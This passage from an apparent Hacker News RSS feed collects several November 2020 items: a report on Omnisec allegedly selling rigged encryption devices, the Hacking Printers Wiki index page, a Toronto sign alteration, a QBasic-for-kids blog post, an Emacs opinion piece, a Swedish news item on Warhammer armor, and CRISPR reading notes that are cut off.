Score 193 | Comments 131 (<a href="https://news.ycombinator.com/item?id=25240179">thread link</a>) | @secfirstmd
<br/>
November 28, 2020 | https://www.swissinfo.ch/eng/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432 | <a href="https://web.archive.org/web/*/https://www.swissinfo.ch/eng/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<section>
<div>
<div>
<figure>
<picture>
<source srcset="https://www.swissinfo.ch/resource/image/46186430/landscape_ratio3x2/880/587/a683e845a8c9bdb270a5b635dfc947ed/gO/omnisec.jpg" media="(min-width: 900px)">
<source srcset="https://www.swissinfo.ch/resource/image/46186430/landscape_ratio3x2/580/387/a683e845a8c9bdb270a5b635dfc947ed/Gx/omnisec.jpg" media="(min-width: 321px)">

</picture>
<figcaption>
Omnisec is the second Swiss company that allegedly sold manipulated encryption devices to US intelligence services. <span>Keystone / Walter Bieri</span>
</figcaption> </figure>
</div>
</div><p>Swiss public television, SRF, has found a second company besides Crypto AG&nbsp;was involved in manufacturing manipulated devices allegedly used for spying by foreign intelligence.</p>
<span>This content was published on November 26, 2020 - 11:34</span>
<time datetime="2020-11-26T11:34:28+01:00">

</time><p>According to <a rel="noopener" target="_blank" href="https://www.srf.ch/news/schweiz/verschluesselungsgeraete-geheimdienstaffaere-weitere-schweizer-firma-rueckt-in-den-fokus">SRF sources</a>, the Swiss company Omnisec AG had ties to US intelligence services. This follows revelations in February by SRF, German television ZDF and <em>The Washington Post</em> that Zug-based firm Crypto AG was at the heart of a huge international spying operation led by the CIA, and to a lesser extent by the German BND spy agency.&nbsp;Omnisec was one of the largest competitors of Crypto AG.</p><p>Swiss cryptologist and professor Ueli Maurer was a consultant for Omnisec for years and told SRF that in 1989 US intelligence services (National Security Agency) contacted Omnisec through him.</p><p>Of concern are the OC-500 series devices. Devices were sold to several Swiss federal agencies. However, Swiss&nbsp;authorities only noticed the devices weren't secure&nbsp;in the mid-2000s.</p><p>Several Swiss companies also received manipulated devices from Omnisec, including Switzerland’s largest bank, UBS. It is unclear whether the authorities informed UBS about the weak devices in the mid-2000s. UBS told SRF that it does not comment on security matters but that it had no indications that sensitive data were exposed at the time.</p>
<p>Omnisec, founded in 1987, manufactured voice, fax and data encryption equipment. It was dissolved a few years ago. The most recent head of the company, Clemens Kammer, told SRF that Omnisec customers “have and will continue to place great value on security, confidentiality, discretion and reliability in business relationships”.</p><p>Some politicians have called for further investigations into these latest allegations that may reveal who, if anyone, in the federal government knew of Omnisec’s business affairs with foreign intelligence.</p><h2>Crypto affair</h2><p>Earlier this month, a nine-month&nbsp;<a rel="noopener" target="_blank" href="https://web.archive.org/web/20201110183555/https:/www.parlament.ch/press-releases/Pages/mm-gpdel-2020-11-10.aspx">investigation</a>&nbsp;by the Swiss parliamentary audit committee (GPDel), found that the Swiss intelligence service knew that the US Central Intelligence Agency was behind the Swiss-based Crypto AG as far back as 1993. The report says that Swiss intelligence later collaborated with them to gather information from foreign sources.&nbsp;</p><p>More than 100 countries bought encryption devices from the Zug-based company, which did business under the guise of Swiss neutrality. In reality, the firm belonged to the CIA and Germany intelligence service, which could freely read what it encrypted. Information intercepted with the help of Crypto’s devices changed the course of events, including the Iran hostage crisis of 1979.</p> </section>
</div></div>]]>
            </description>
            <link>https://www.swissinfo.ch/eng/second-swiss-firm-allegedly-sold-encrypted-spying-devices/46186432</link>
            <guid isPermaLink="false">hacker-news-small-sites-25240179</guid>
            <pubDate>Sat, 28 Nov 2020 20:18:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Hacking Printers Wiki, an open approach to share knowledge on printr]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25239627">thread link</a>) | @rolph
<br/>
November 28, 2020 | http://hacking-printers.net/wiki/index.php/Main_Page | <a href="https://web.archive.org/web/*/http://hacking-printers.net/wiki/index.php/Main_Page">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="bodyContent">
									<p>From Hacking Printers</p>
								
												
				<div id="mw-content-text" lang="en" dir="ltr"><div>
<p>This is the <b>Hacking Printers Wiki</b>, an open approach to share knowledge on printer (in)security.
</p>
</div>
<table id="mp-upper">

<tbody><tr>
<td>

</td>
<td>
</td>
<td>
<table id="mp-right">
<tbody><tr>
<td> <h2 id="mp-otd-h2"><span id="Tools">Tools</span></h2>
</td></tr>
<tr>
<td>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/PRET" title="PRET">PRET</a>, <a href="http://hacking-printers.net/wiki/index.php/Praeda" title="Praeda">Praeda</a>, <a href="http://hacking-printers.net/wiki/index.php/PFT" title="PFT">PFT</a>, <a href="http://hacking-printers.net/wiki/index.php/BeEF" title="BeEF">BeEF</a></li></ul>
</td></tr>
<tr>
<td> <h2 id="mp-itn-h2"><span id="Fundamentials">Fundamentials</span></h2>
</td></tr>
<tr>
<td>
<ul><li> <b><a href="http://hacking-printers.net/wiki/index.php/Fundamentals#Printer_Control_Languages" title="Fundamentals">Printer languages</a></b>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/PJL" title="PJL">PJL</a>, <a href="http://hacking-printers.net/wiki/index.php/PCL" title="PCL">PCL</a>, <a href="http://hacking-printers.net/wiki/index.php/PostScript" title="PostScript">PostScript</a></li></ul></li>
<li> <b><a href="http://hacking-printers.net/wiki/index.php/Fundamentals#Network_printing_protocols" title="Fundamentals">Network protocols</a></b>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/LPD" title="LPD">LPD</a>, <a href="http://hacking-printers.net/wiki/index.php/IPP" title="IPP">IPP</a>, <a href="http://hacking-printers.net/wiki/index.php/Raw" title="Raw">Raw</a>, <a href="http://hacking-printers.net/wiki/index.php/SMB" title="SMB">SMB</a></li></ul></li></ul>
</td></tr>
<tr>
<td> <h2 id="mp-otd-h2"><span id="Attack_Carriers">Attack Carriers</span></h2>
</td></tr>
<tr>
<td>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/USB_drive_or_cable" title="USB drive or cable">USB drive or cable</a></li>
<li> <a href="http://hacking-printers.net/wiki/index.php/Port_9100_printing" title="Port 9100 printing">Port 9100 printing</a></li>
<li> <a href="http://hacking-printers.net/wiki/index.php/Cross-site_printing" title="Cross-site printing">Cross-site printing</a></li></ul>
</td></tr>
<tr>
<td> <h2 id="mp-otd-h2"><span id="Countermeasures">Countermeasures</span></h2>
</td></tr>
<tr>
<td>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/Countermeasures#Vendors" title="Countermeasures">Vendors</a>, <a href="http://hacking-printers.net/wiki/index.php/Countermeasures#Admins" title="Countermeasures">Admins</a>, <a href="http://hacking-printers.net/wiki/index.php/Countermeasures#Users" title="Countermeasures">Users</a></li></ul>
</td></tr>
<tr>
<td> <h2 id="mp-otd-h2"><span id="Bibliography">Bibliography</span></h2>
</td></tr>
<tr>
<td>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/Bibliography" title="Bibliography">Literature on printer security</a></li></ul>
</td></tr>
<tr>
<td> <h2 id="mp-otd-h2"><span id="References">References</span></h2>
</td></tr>
<tr>
<td>
<ul><li> <a href="http://hacking-printers.net/wiki/index.php/References" title="References">Printer language references</a></li></ul>
</td></tr></tbody></table>
</td></tr></tbody></table>
<div>
<table id="mp-center">
<tbody><tr>
<td><h2 id="mp-tfl-h2"><span id="Beyond_Printers">Beyond Printers</span></h2></td>
</tr><tr>
<td><p>Comming soon: <i>Hacking PostScript processing websites</i></p></td>
</tr>
</tbody></table>
</div>

<!-- 
NewPP limit report
Cached time: 20201129203140
Cache expiry: 86400
Dynamic content: false
CPU time usage: 0.068 seconds
Real time usage: 0.070 seconds
Preprocessor visited node count: 19/1000000
Preprocessor generated node count: 56/1000000
Post‐expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Highest expansion depth: 1/40
Expensive parser function count: 0/100
-->

<!-- 
Transclusion expansion time report (%,ms,calls,template)
100.00%    0.000      1 - -total
-->

<!-- Saved in parser cache with key wiki:pcache:idhash:1-0!*!0!!*!*!* and timestamp 20201129203140 and revision id 648
 -->
</div>					
								
							</div></div>]]>
            </description>
            <link>http://hacking-printers.net/wiki/index.php/Main_Page</link>
            <guid isPermaLink="false">hacker-news-small-sites-25239627</guid>
            <pubDate>Sat, 28 Nov 2020 19:01:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA['Welcome to Toronto' sign altered to read 'Ontario's capital in overdose deaths']]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25239598">thread link</a>) | @app4soft
<br/>
November 28, 2020 | https://toronto.citynews.ca/2020/11/23/toronto-welcome-sign-altered-overdose-deaths/ | <a href="https://web.archive.org/web/*/https://toronto.citynews.ca/2020/11/23/toronto-welcome-sign-altered-overdose-deaths/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="article-meta">
        
    <p itemprop="datePublished">Posted Nov 23, 2020 1:09 pm EST</p>
    <p itemprop="dateModified">Last Updated Nov 23, 2020 at 10:07 pm EST</p>             
        
    </div><div id="main-article">
    <div>
	    					
	    
        

        <div id="article-body-content" itemprop="articleBody"> 
        	<p>An unofficial addition has been made to a sign welcoming drivers to Toronto that casts the province’s capital in a less than flattering light.</p>
<p>The sign, on the border with Mississauga along Burnamthorpe Road, used to read “Welcome to Toronto. Ontario’s capital.” With the unauthorized addendum, it now reads “Ontario’s capital in overdose deaths.”</p>
<p>The addition appears to be a plank covered in a vinyl sign, printed to mimic the original sign’s colours and font, attached below it with zip-ties.</p>
<p>CityNews viewers alerted us to the changes and say a few signs in the area have been altered in this manner.</p>

<p>According to the chief coroner’s office, an estimated 50 to 80 people per week are dying of overdoses in Ontario.</p>
<p>Across the country, the COVID-19 pandemic has exacerbated the opioid crisis. Opioid overdoses have risen sharply since March as the border closure and limited access to services raise fatal risks for drug users.</p>
<p>It is unclear who created the additional signage and whether it is in fact referring to this disturbing rise in numbers — a stark reversal of the 13 per cent decline in fatal opioid overdoses between 2018 and 2019.</p>
<p>The signs were addressed in the city’s daily COVID-19 briefing question and answer session on Monday.</p>
<p>Mayor John Tory said he has repeatedly expressed “deep concern” about the overdose rates and feels not enough attention has been given to the issue.</p>
<p>“While this isn’t necessarily the single best way to draw attention to this, it is something that’s got us talking about it and I think the more we talk about it the more we advocate for greater action on the part of all governments,” said Tory.</p>
<p>Tory said Toronto Public Health has a “significant harm reduction program,” but added that the city needs more provincial support.</p>
<p>The city said the signs have been addressed by city staff and have now been corrected.</p>
<p><em>With files from The Canadian Press</em></p>
        </div>
        
		        
		 
        
                    
        	</div><!--/ 16 -->     
</div></div>]]>
            </description>
            <link>https://toronto.citynews.ca/2020/11/23/toronto-welcome-sign-altered-overdose-deaths/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25239598</guid>
            <pubDate>Sat, 28 Nov 2020 18:56:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[30 years later, QBasic is still the best]]>
            </title>
            <description>
<![CDATA[
Score 294 | Comments 122 (<a href="https://news.ycombinator.com/item?id=25239424">thread link</a>) | @ohjeez
<br/>
November 28, 2020 | http://www.nicolasbize.com/blog/30-years-later-qbasic-is-still-the-best/ | <a href="https://web.archive.org/web/*/http://www.nicolasbize.com/blog/30-years-later-qbasic-is-still-the-best/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p><span><em>(5 minutes read)</em></span></p>
<p><span>My oldest son Noah turned 7 three months ago. If he could trade his family for a 2 hour session of playing minecraft, he would do it in a heartbeat. The other love of his life is Super Mario Maker, and&nbsp;it’s been a thrill to see him play the same game and levels that I played when I was his age. About 5 months ago, I left my family for my yearly pilgrimage of <a href="http://ludumdare.com/compo/">ludum dare</a>: a game dev competition during which I lock myself away with friends, return to a&nbsp;state of primitive caveman, not sleep for 48h, and create&nbsp;a full game from scratch (play it at the end of this post!) As I proudly showed my revolutionary AAA title to my wife, Noah was naturally intrigued and I introduced him to the world of code, showing him how simple&nbsp;words&nbsp;(he had just learned how to read) produced an actual game. Since&nbsp;that very day, Noah&nbsp;has been asking me repeatedly to teach him how to make&nbsp;his own video games. And for the past 5 months, I have been looking for the holy grail of language/IDE for kids in the hope of turning that spark of interest into a memorable experience…</span></p>
<p><span>My quest has led me to&nbsp;endless forums, through which I have tried countless suggestions: SmallBasic, Pico-8, Smalltalk, Scratch, etc. I have even inquired of the Great&nbsp;Oracles of StackOverflow,&nbsp;to&nbsp;no avail. After 5 months,&nbsp;I&nbsp;ended up with a disappointing conclusion: nothing is even close to what I had back in another era. 30 years later, QBasic is still the best when it comes to&nbsp;discovering programming.&nbsp;</span></p>
<blockquote>
<p><span>“OMG please don’t teach him GOTOs!!”</span></p>
</blockquote>
<pre><code>10 PRINT “OH NO, WHAT ARE YOU DOING?!!!”
20 GOTO 10</code></pre>
<p><span>Yes, QBasic is a terrible procedural language. It introduces one to concepts widely considered harmful, uses awkward syntax for implicit declarations, is not case sensitive, is non-zero-based, etc. the list goes on… When developing a skill, it is much better to acquire the right reflexes from the start rather than have to correct years of bad practice. Following this advice, I should have probably started off with&nbsp;the basics of the ruby language which I love. Yet, while most of those QBasic concepts are today generally considered&nbsp;as red flags by our peers, they each served a very specific&nbsp;purpose at the time: to keep the language simple and accessible, a notion that every other language has left behind in favor of flexibility, complexity and logic.</span></p>
<p><span>I installed QBasic on my son’s 11” HP Stream today, having to hack a DOSBox manual installation. He double clicked the icon on his desktop and in a split second, we were in the IDE, greeted with the introduction screen which brought back so many memories to my mind:</span></p>
<p><img src="https://upload.wikimedia.org/wikipedia/en/0/01/QBasic_Opening_Screen.png" alt="" width="640" height="400"></p>
<p><span>I then told Noah that there was a very sacred ritual, mandatory&nbsp;for anyone who enters the secret&nbsp;inner&nbsp;circle of programmers, to start off with a program that greets every other programmer out there. As I dictated the formula, he slowly&nbsp;searched for each&nbsp;key, carefully&nbsp;typing with his right finger&nbsp;the magic words: <code>PRINT “hello world”</code></span></p>
<p><span>He pressed F5 and looked amazed as he saw his code being compiled into text rendered on his black screen. He smiled, gave me a high-five, and then scribbled down the code in his little notebook so that he could remember later.</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_1.jpg" alt="" width="800" height="600"></p>
<p>We went on to a couple more commands: CLS, COLOR, PLAY, INPUT, and IF. There was nothing to explain: no complexity, no awkward operator, no abstract concepts, no documentation that needed to be read, no notion of objects/class/methods, no framework to install, no overwhelming menu/buttons in the IDE, no special keyword or parenthesis. It was code in its purest simplicity and form.</p>
<p><span>After less than an hour, he wrote his first program on his own – an interactive and incredibly subtle application which lets you know the computer’s feelings towards&nbsp;you as an individual and sensible human being:</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_3.jpg" alt="" width="800" height="600"></p>
<p><span>…which he ran with utmost pride for his cousin and best friend Christian:</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_4.jpg" alt="" width="800" height="600"></p>
<p><span>…after which he proceeded to easily explain him&nbsp;</span><span><b>how</b></span><span>&nbsp;it worked and what the code was doing!</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_5.jpg" alt="" width="800" height="600"></p>
<p><span>And so it was that in a single hour, my 7 year old was able to not only write his first text game, but also to experience the fun and thrill that comes from creating, compiling and executing his own little program. Bonus points, it all fit on a single notebook page:</span></p>
<p><img src="http://nicolasbize.com/blog/images/noah_2.jpg" alt="" width="600" height="800"></p>
<p><span>I was so glad that he was able to understand why I keep saying that I have the best job in the world.&nbsp;</span><span>My only regret today was to realize that in more than 30 years, we have not been able to come up with something&nbsp;better for our kids: Qbasic has a limited set of simple keywords (the entire help fits on a single F1 screen and is packed with simple examples!), does not distract the coder with any visual artifacts, has a very confined and cosy dev environment, shows errors as early as possible, compiles and executes the code in a heartbeat with a single key, and is extremely straightforward. &nbsp;We have built more robust and more complex languages/frameworks/IDEs (which are of course necessary for any real-life application), but we have never really made a simpler or more direct access to the thrill of programming than QBasic. Even running QBasic today has become dreadful&nbsp;to the novice that uses&nbsp;a modern Mac/PC/Linux machine, whereas it used to simply require inserting a 3,5” floppy in the A:\ disk drive…</span></p>
<p><span>Enough rant, today is all about the celebration of yet another person who discovered the excitement and beauty of programming!</span></p>
<p><span>Cheers!</span></p>
<p><span>(as promised, <a href="http://nicolasbize.com/ld34/">my AAA title</a> for which I await&nbsp;EA’s call to purchase copyrights)</span></p>
			</div></div>]]>
            </description>
            <link>http://www.nicolasbize.com/blog/30-years-later-qbasic-is-still-the-best/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25239424</guid>
            <pubDate>Sat, 28 Nov 2020 18:32:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Machine Learning for Art with Google’s Emil Wallner]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25239217">thread link</a>) | @andreyk
<br/>
November 28, 2020 | https://www.letstalkai.show/e/mlart-interview/ | <a href="https://web.archive.org/web/*/https://www.letstalkai.show/e/mlart-interview/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<div>


		
			<div id="post-15958234">
				<p><a href="https://www.letstalkai.show/">
										<img src="https://pbcdn1.podbean.com/imglogo/image-logo/7703921/Lets_Talk_Logo.jpg"></a></p><div>
				<div>
					
					<p>Nov 27th, 2020 by <a title="Posts by Skynet Today">Skynet Today</a> </p>
				</div>

				<div>
					 <div>
<p>An interview with <span>Emil Wallner, the creator of mlart.co . Emil is an internet-educated, independent machine learning researcher, and resident at the Google Arts &amp; Culture Lab. As a resident at Google he is using machine learning to explore art and culture. Part-time, he applies machine learning to logical tasks such as programming and mathematics.</span></p>
<p>Subscribe: <a href="https://feed.podbean.com/aitalk/feed.xml">RSS</a> | <a href="https://podcasts.apple.com/us/podcast/lets-talk-ai/id1502782720">iTunes</a> | <a href="https://open.spotify.com/show/17HiNdxcoKJLLNibIAyUch">Spotify</a> | <a href="https://www.youtube.com/channel/UCKARTq-t5SPMzwtft8FWwnA">YouTube</a></p>
<div>
<p>Check out coverage of similar topics at <a href="http://www.skynettoday.com/">www.skynettoday.com</a></p>
<p>Theme: Deliberate Thought Kevin MacLeod (incompetech.com)</p>
</div>
</div>
									</div>

				

   <p><span id="postbar_15958234"> <span> | </span><a href="https://www.podbean.com/site/EpisodeDownload/PBF380DAKYNN9" target="_blank">Download</a> </span></p>			</div>

		


	</div>
</div>
</div></div>]]>
            </description>
            <link>https://www.letstalkai.show/e/mlart-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25239217</guid>
            <pubDate>Sat, 28 Nov 2020 18:08:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Opinion: RMS Does Not See the Future of Emacs]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25239111">thread link</a>) | @ashton314
<br/>
November 28, 2020 | https://lambdaland.org/posts/2020-11-future-of-emacs/ | <a href="https://web.archive.org/web/*/https://lambdaland.org/posts/2020-11-future-of-emacs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

      <p>
        <h3>RMS Does Not See the Future of Emacs
        </h3>
        
        </p>

    <p>I am an avid <a href="https://emacs.org/">Emacs</a> user. I’m using it right now to compose this post. I use it every single day for everything from work to school to personal notes. Most of my activity on GitHub comes from me tweaking little things in my configuration files. I now have an editor that perfectly fits my hands. Emacs is a big part of my life.</p>
<p>I’m afraid it’s dying.</p>
<p>Richard Stallman, one of the principle creators of Emacs and the head of the GNU Project, has made several choice in the past several months that I consider to be detrimental to the Emacs community and harmful for Emacs' further growth. RMS doesn’t seem to care that much about making Emacs appealing to new users, and I think this is a mistake. Emacs derives its strength from being uniquely customizable and extensible; the more people we get using Emacs, the more good extensions, packages, tutorials, etc. will be available for Emacs. Some of the growth-hostile things include:</p>
<ul>
<li>Shutting down suggestions for making Emacs start with a sensible set of defaults that would make it significantly easier for beginners to get started<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></li>
<li>Purging links to the most popular (and most useful!) Emacs package repositories, Melpa and Marmalade, just because they <em>might</em> contain links to sites with non-free Javascript<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></li>
<li>Ignoring community-driven development and exercising veto rule in cases where I personally think it was unwarranted<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup></li>
</ul>
<p>I can appreciate strong leadership; I think for creating most things, having a single leader drive the development of a product gives it focus and direction that otherwise might kill it off. (I think Python is a good example of this at work.) In this case with Emacs, however, I think RMS is badly out of touch and should focus on what we as a community can do to make Emacs more robust so that future generations of programmers will have a strong motivation to use Emacs—a desire to run free software motivates precious few people in their selection of their tools. We should make it more appealing for its features and performance as well.</p>
<p>Some areas where Emacs stands to improve are:</p>
<ul>
<li><strong>Beginner-friendliness</strong> The default Emacs theme looks awful. No computer user used to the comforts of macOS or Windows would want to go near that ugly beast. It should have a pretty-looking theme by default. One idea would be to make it so that a new user can select some pre-built themes.</li>
<li><strong>Performance</strong> There are some exciting things happening with gccemacs on this front. I’m not running that right now, as compiling Emacs master on macOS is a little persnickety. Improving its rendering engine would help too. I recognize that that is a big undertaking, and unfortunately I have little to offer in this regard.</li>
<li><strong>Ease of contribution</strong> Why not host Emacs development on a self-hosted GitLab instance? Or use some other issue tracker? I understand that there are some advantages for mailing lists, but the set of programmers who are a.) familiar with that work flow, and b.) prefer it, is dwindling. An issue/PR-style flow makes a lot more sense for most developers, and I think it would go a long way to enriching community involvement in Emacs' core development.</li>
</ul>
<p>These are just my thoughts, and will likely evolve over time. Unfortunately I cannot devote as much time as I would like to improving Emacs, though I do enjoy <a href="https://github.com/ashton314/gilded-select">learning to write packages</a> when I have the time.</p>
<p>Good luck, all you Emacs maintainers out there. You’re heroes.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p><a href="https://lwn.net/Articles/819452/">https://lwn.net/Articles/819452/</a> <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p><a href="https://github.com/emacs-mirror/emacs/commit/5daa7a5fd4aced33a2ae016bde5bb37d1d95edf6">https://github.com/emacs-mirror/emacs/commit/5daa7a5fd4aced33a2ae016bde5bb37d1d95edf6</a> <a href="#fnref:2" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p><a href="http://ergoemacs.org/misc/rms_emacs_tyrant_2018-03.html">http://ergoemacs.org/misc/rms_emacs_tyrant_2018-03.html</a> <a href="#fnref:3" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>
    </div></div>]]>
            </description>
            <link>https://lambdaland.org/posts/2020-11-future-of-emacs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25239111</guid>
            <pubDate>Sat, 28 Nov 2020 17:56:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Artist built usable 40k Space Marine armor (video, swe)]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25239082">thread link</a>) | @m_eiman
<br/>
November 28, 2020 | https://www.svt.se/nyheter/lokalt/norrbotten/har-dundrar-han-fram-i-sin-2-7-meter-langa-warhammer-drakt | <a href="https://web.archive.org/web/*/https://www.svt.se/nyheter/lokalt/norrbotten/har-dundrar-han-fram-i-sin-2-7-meter-langa-warhammer-drakt">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><figure><div><div><div><div><div><p><img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div></div></div><div><div><p>Javascript måste vara påslaget för att kunna spela video</p></div></div><div><div><p>SVT stödjer inte uppspelning i din webbläsare. Vi rekommenderar därför att du byter till en annan webbläsare.</p></div></div></div></div><figcaption><span>I klippet ser du Svjan Köppe när han intar soptippen i sin massiva Warhammer-dräkt. <span>Foto: <!-- -->Marcel Köppe/Privat</span></span></figcaption></figure></div><p><section><span title="28 november 2020 kl 06:49"><span>Publicerad</span> <time datetime="2020-11-28T06:49:43+01:00">28 november 2020</time></span></section></p><div><p>Han har byggt en monsterdrake och en pansarbjörn tidigare. Nu har Svjan Köppe i Älvsbyn slagit till med en 2,7 meter lång Warhammerkrigare.</p><p>– Jag skapade den på golvet i lägenheten, säger han.</p></div><div><div><p>Efter den uppmärksammade Game of Thrones-draken och den 150 kg tunga björnen väljer Svjan Köppe att satsa mer på höjd och rörlighet. Den nya skapelsen är en ”Space Marine” från spelet Warhammer 40&nbsp;000.</p><p>Det tog fyra månader att bygga jätten som mäter 2,7 meter och kan röra sig framåt. Verkstaden? Hemma på golvet i lägenheten och det är ingen lättviktare.</p><p>– Bara svärdet är väldigt tungt och maffigt att hålla i. Dessutom ska det bara hållas med en hand som figuren gör, säger han.</p><p><em>I klippet ser du Svjan iklädd Warhammer-dräkten och hör om hans framtida projekt</em></p><figure><div data-lpid="29247098"><div><p><img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p></div></div><figcaption><span>Svjan Köppe, Älvsbyn, har byggt en GoT-drake och Pansarbjörn tidigare. Nu har han färdigställt en Warhammer-figur. <span>Foto: <!-- -->Jimmy Bäckström/SVT</span></span></figcaption></figure></div><section></section></div><section><p><span>SVT:s nyheter ska stå för saklighet och opartiskhet. Det vi publicerar ska vara sant och relevant. Vid akuta nyhetslägen kan det vara svårt att få alla fakta bekräftade, då ska vi berätta vad vi vet – och inte vet. </span><a href="https://www.svt.se/nyheter/sa-arbetar-vi-pa-svt-nyheter"><span>Läs mer</span></a></p></section></article></div></div>]]>
            </description>
            <link>https://www.svt.se/nyheter/lokalt/norrbotten/har-dundrar-han-fram-i-sin-2-7-meter-langa-warhammer-drakt</link>
            <guid isPermaLink="false">hacker-news-small-sites-25239082</guid>
            <pubDate>Sat, 28 Nov 2020 17:52:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Crispr- A Crack in the Creation book reading notes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25238740">thread link</a>) | @orsenthil
<br/>
November 28, 2020 | http://xtoinfinity.com/posts/2020/11/27/a-crack-in-creation-by-jennifer-doudna-and-samuel-steinberg.html | <a href="https://web.archive.org/web/*/http://xtoinfinity.com/posts/2020/11/27/a-crack-in-creation-by-jennifer-doudna-and-samuel-steinberg.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
    <div>
<p><strong>A Crack in Creation: Gene Editing and Unthinkable power to control evolution</strong>
by Jennifer Doudna and Samuel Steinberg is a book on gene-editing and a
technology called CRISPR.</p>
<p>The book is a personal narration of Jennifer Doudna as she explains the
development of CRISPR and it's discovery for use in gene editing.  Rather than a
review, this are notes while reading this book.  CRISPR is molecular structure
found in Bacteria, but now more popular term, commonly associated with a gene
editing technique.</p>
<p><em>Given the technical nature of this article, I must have used the text from the
sources only with slight modification for explanation. References should give
the materials I consulted to write this post. In you notice technical
inaccuracy, I aplogize, please point out, and I will correct it.</em></p>
<p><strong>Terms</strong></p>
<p>As I reader, I found reviewing biological terms helped me understand the
material better.</p>
<div>
<p><img alt="https://dl.dropbox.com/s/3cn83qir2ip3nso/Screenshot_2020-11-28-04-50.png" src="https://dl.dropbox.com/s/3cn83qir2ip3nso/Screenshot_2020-11-28-04-50.png"></p><p>DNA, the language of life. Figure from <em>A Crack in Creation</em> book.</p>
</div>
<p>Human Body is made of <strong>cells</strong>, in-fact trillions of cells. Each of these cells
contain something called DNA. <strong>DNA</strong> is like recipe, just like a food recipe,
but for building and maintaining living organisms.</p>
<p>Cells use DNA to make proteins. Proteins are the workhorses of the body, they do
all the stuff we need to do to survive, from digesting food to making other
proteins.  Proteins are molecules made up of cells.</p>
<p>DNA is made up of a long combination of some very basic organic components
called Adenine, Thymine, Guanine and Cytosine. Human DNA consists of about 3
billion of these. The sequence of these determines the information available for
building and maintaining an organism, similar to the way in which letters of the
alphabet appear in a certain order to form words and sentences.</p>
<p>In the nucleus of each cell, the DNA molecule is packaged into thread-like
structure called <strong>chromosomes</strong>. A <em>Chromosome</em> is a DNA containing structure.</p>
<p>RNA are like cousins of DNA, which has an oxygen atom with it. One type called
messager RNA, mRNA, act as carrier of information to different cells, carrying
information from DNA to those cells to produce proteins.</p>
<p>So far, in above definitions, we didn't emphasize on <em>heredity</em> , that is,
sending information from parent to child yet. As soon as we start talking about
<em>heredity</em>, we use the term, <strong>Genes</strong>.</p>
<p>A gene is the basic physical and functional unit of heredity. Each chromosome of
human body has many genes.</p>
<p>If we take a single cell from human body, and find out the entire set of
<em>genetic information</em> in the chromosomes of that cell, we call that a
<strong>Genome</strong>. A Genome, from <strong>Gen</strong> e and Chromos <strong>ome</strong>, is the entire set of
<em>genetic</em> instructions found inside a cell.</p>
<p><strong>CRISPR in bacteria</strong></p>
<p>Single celled organisms like Bacteria were using a technique to fight off some
diseases.  The term CRISPR was given to an identified characteristic in
Bacterial DNA sequence, which was used to produce a protein called CAS-9, which
in turn, helped to kill the enemy virus.</p>
<p>CRISPR stands for Clustered Regularly Interspaced Short Palindromic Repeats and
is a family of DNA Sequences found in genomes of bacteria. CAS9 stands for
CRISPR associated protein 9.</p>
<p>The bacteria were found to capture snippets of DNA from invading viruses and use
them to create DNA segments known as CRISPR arrays. The CRISPR arrays allow the
